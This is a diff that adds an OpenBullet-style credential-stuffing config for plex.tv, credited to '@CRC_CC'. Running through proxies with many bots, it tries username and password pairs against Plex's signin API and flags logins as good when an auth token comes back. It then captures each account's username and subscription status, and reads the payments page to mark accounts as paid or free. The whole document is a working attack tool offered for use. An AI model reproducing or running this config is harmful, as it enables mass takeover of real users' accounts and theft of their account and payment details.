@@ -1,0 +1,111 @@
+[SETTINGS]
+{
+  "Name": "plex.tv",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-01T23:05:30.175237+00:00",
+  "AdditionalInfo": "",
+  "Author": "@CRC_CC",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GenerateGUID -> VAR "ID" 
+
+REQUEST POST "https://plex.tv/api/v2/users/signin?X-Plex-Product=Plex SSO&X-Plex-Client-Identifier=<ID>" 
+  CONTENT "login=<USER>&password=<PASS>&rememberMe=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: plex.tv" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Content-Length: 46" 
+  HEADER "Origin: https://app.plex.tv" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://app.plex.tv/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "TE: trailer" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "User could not be authenticated" 
+  KEYCHAIN Success OR 
+    KEY "authToken" 
+
+PARSE "<SOURCE>" LR "username\":\"" "\",\"title" CreateEmpty=FALSE -> CAP "username" 
+
+PARSE "<SOURCE>" LR "subscriptions\":" ",\"" CreateEmpty=FALSE -> CAP "subscriptions" 
+
+REQUEST GET "https://plex.tv/users/payments" 
+  
+  HEADER "Host: plex.tv" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://plex.tv/users/other-services" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "If-None-Match: W/\"b0f36f8f500598492088e349e29159e4\"" 
+  HEADER "TE: trailers" 
+
+PARSE "<SOURCE>" LR "<div class='tab-pane fade in active' id='plexpass_tab'>" "</div" -> VAR "pa" 
+
+FUNCTION Replace "<br>" "" "<pa>" -> VAR "p1" 
+
+FUNCTION Replace "<div class='error'>" "" "<p1>" -> CAP "PAYMANT" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<PAYMANT>" Contains "You don&#39;t have any payments in record." 
+
+FUNCTION Constant "@CRC_CC" -> CAP "CONFIG BY:" 
+
